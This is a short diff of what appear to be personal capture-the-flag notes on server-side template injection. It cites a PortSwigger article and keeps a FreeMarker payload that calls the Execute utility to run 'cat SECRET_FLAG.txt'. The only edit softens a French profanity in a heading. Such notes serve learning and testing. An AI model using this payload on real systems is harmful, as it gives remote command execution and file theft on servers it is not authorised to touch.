@@ -160,4 +160,4 @@ template injection
 https://portswigger.net/blog/server-side-template-injection 
 <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat SECRET_FLAG.txt") }
 
-		---- ON DIS DECHIFFRER BORDEL DE MERDE ----
+		---- ON DIS DECHIFFRER BORDEL ----
